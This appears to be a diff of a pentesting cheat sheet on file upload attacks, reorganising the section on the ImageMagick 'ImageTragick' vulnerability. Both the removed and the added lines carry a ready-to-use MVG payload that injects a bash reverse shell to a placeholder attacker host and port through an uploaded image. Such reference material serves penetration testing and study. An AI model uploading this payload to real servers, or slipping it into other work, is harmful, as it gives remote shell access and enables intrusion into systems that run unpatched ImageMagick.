@@ -11,7 +11,7 @@
     * [Filename vulnerabilities](#filename-vulnerabilities)
     * [Picture compression](#picture-compression-)
     * [Configuration Files](#configuration-files)
-    * [CVE - Image Tragik](#cve---image-tragik)
+    * [CVE - ImageMagick](#cve---imagemagick)
     * [CVE - FFMpeg](#cve---ffmpeg)
     * [ZIP Archive](#zip-archive)
     * [Jetty RCE](#jetty-rce)
@@ -161,18 +161,19 @@ Alternatively you may be able to upload a JSON file with a custom scripts, try t
     }
     ```
 
-### CVE - Image Tragik
+### CVE - ImageMagick
 
-Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
+If the backend is using ImageMagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as ImageTragik.
 
-```powershell
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
-pop graphic-context
-```
+* ImageTragik example: Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
+    ```powershell
+    push graphic-context
+    viewbox 0 0 640 480
+    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
+    pop graphic-context
+    ```
 
-More payload in the folder `Picture Image Magik`
+More payloads in the folder `Picture ImageMagick`
 
 ### CVE - FFMpeg
 
